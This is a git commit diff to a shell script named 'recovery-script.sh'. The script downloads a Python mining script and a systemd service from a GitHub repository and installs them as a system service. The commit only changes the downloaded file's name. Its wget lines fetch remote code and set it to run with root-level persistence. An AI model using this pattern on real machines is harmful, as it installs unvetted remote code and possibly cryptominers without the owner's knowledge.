528752458394436b608365fd91b797902d1cb474
Anderson816 <mmucollegeofpharmacyramanagara@gmail.com>
2025-07-20 14:32:21 +0530

    Update recovery-script.sh

--- recovery-script.sh
+++ recovery-script.sh
@@ -1,11 +1,11 @@
 #!/bin/bash
 
 # Download mining script and systemd service from remote server
-wget -O /home/administrator/forever.py.2 https://raw.githubusercontent.com/Anderson816/foreverminer/refs/heads/main/forever.py.2
+wget -O /home/administrator/forever.py https://raw.githubusercontent.com/Anderson816/foreverminer/refs/heads/main/forever.py
 wget -O /etc/systemd/system/mining.service https://raw.githubusercontent.com/Anderson816/foreverminer/refs/heads/main/mining.service
 
 # Make sure the script is executable
-chmod +x /home/administrator/forever.py.2
+chmod +x /home/administrator/forever.py
 
 # Reload systemd to recognize the new service
 systemctl daemon-reload
